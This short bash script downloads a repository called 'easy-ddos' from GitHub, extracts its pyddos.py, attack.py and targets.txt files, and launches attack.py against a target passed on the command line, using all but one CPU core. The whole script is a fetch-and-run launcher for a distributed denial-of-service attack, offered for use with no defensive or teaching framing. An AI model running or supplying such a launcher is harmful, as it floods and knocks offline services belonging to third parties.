#!/bin/bash

REPO_NAME=easy-ddos
ACTUAL_TAG=master

URL="https://github.com/julfy/$REPO_NAME/archive/refs/heads/$ACTUAL_TAG.zip"
# from tag: URL="https://github.com/julfy/$REPO_NAME/archive/refs/tags/$ACTUAL_TAG.zip"

# Download or update
curl -L --output "$ACTUAL_TAG.zip" "$URL"
# or wget -q "$URL"

# Extract
unzip -o "$ACTUAL_TAG.zip"
mv "$REPO_NAME-$ACTUAL_TAG/pyddos.py" .
mv "$REPO_NAME-$ACTUAL_TAG/attack.py" .
mv "$REPO_NAME-$ACTUAL_TAG/targets.txt" .

# Cleanup
rm -rf "$ACTUAL_TAG.zip" "$REPO_NAME-$ACTUAL_TAG"

# Start
CPUS=$[$(nproc --all) - 1] # use <total CPU cores> - 1
python3 attack.py -s "$1" -n $CPUS
